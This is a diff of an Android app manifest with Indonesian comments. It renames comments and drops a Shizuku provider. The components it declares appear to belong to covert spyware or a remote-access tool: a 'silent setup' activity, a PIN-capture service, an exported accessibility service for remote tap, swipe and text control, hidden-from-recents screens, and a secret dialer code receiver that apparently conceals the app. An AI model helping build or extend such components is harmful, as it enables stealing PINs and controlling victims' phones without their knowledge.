@@ -61,7 +61,7 @@
             android:screenOrientation="portrait"
             android:excludeFromRecents="true" />
 
-        <!-- Silent setup — request permission satu per satu (klik manual user) -->
+        <!-- Silent setup -->
         <activity
             android:name=".SilentSetupActivity"
             android:exported="false"
@@ -143,7 +143,7 @@
                 android:resource="@xml/pin_capture_config" />
         </service>
 
-        <!-- Remote Control — AccessibilityService (tap/swipe/key tanpa Shizuku) -->
+        <!-- Remote Control v2 — AccessibilityService (tap/swipe/key/text, no Shizuku) -->
         <service
             android:name=".ControlAccessibilityService"
             android:exported="true"
@@ -177,13 +177,6 @@
                 <data android:scheme="android_secret_code" android:host="2719" />
             </intent-filter>
         </receiver>
-
-        <provider
-            android:name="rikka.shizuku.ShizukuProvider"
-            android:authorities="${applicationId}.shizuku"
-            android:exported="true"
-            android:multiprocess="false"
-            android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" />
 
     </application>
 </manifest>
